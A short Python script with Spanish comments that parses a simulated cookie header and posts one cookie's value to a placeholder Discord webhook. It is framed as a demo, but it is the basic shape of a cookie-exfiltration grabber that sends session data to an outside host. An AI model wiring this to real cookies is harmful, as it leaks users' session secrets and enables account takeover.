import requests
from http.cookies import SimpleCookie

# Simulación de cookies obtenidas (normalmente sería del navegador o del servidor HTTP)
cookie_header = "cookie_name=value1; another_cookie=value2"

# Parseamos las cookies desde el header simulado
cookie = SimpleCookie()
cookie.load(cookie_header)

# Elige el nombre de la cookie que quieres obtener
cookie_name = "cookie_name"

# Extrae el valor de la cookie específica
cookie_value = cookie[cookie_name].value if cookie_name in cookie else None

# Configura la URL del webhook de Discord
webhook_url = 'https://discord.com/api/webhooks/your_webhook_id/your_webhook_token'

# Si encontramos el valor de la cookie, lo enviamos a Discord
if cookie_value:
    data = {
        "content": f"El valor de la cookie '{cookie_name}' es: {cookie_value}"
    }

    # Envía el mensaje a Discord
    response = requests.post(webhook_url, json=data)

    # Verifica si el mensaje fue enviado correctamente
    if response.status_code == 204:
        print("Mensaje enviado exitosamente.")
    else:
        print(f"Error al enviar el mensaje. Código de estado: {response.status_code}")
else:
    print(f"La cookie '{cookie_name}' no se encontró.")
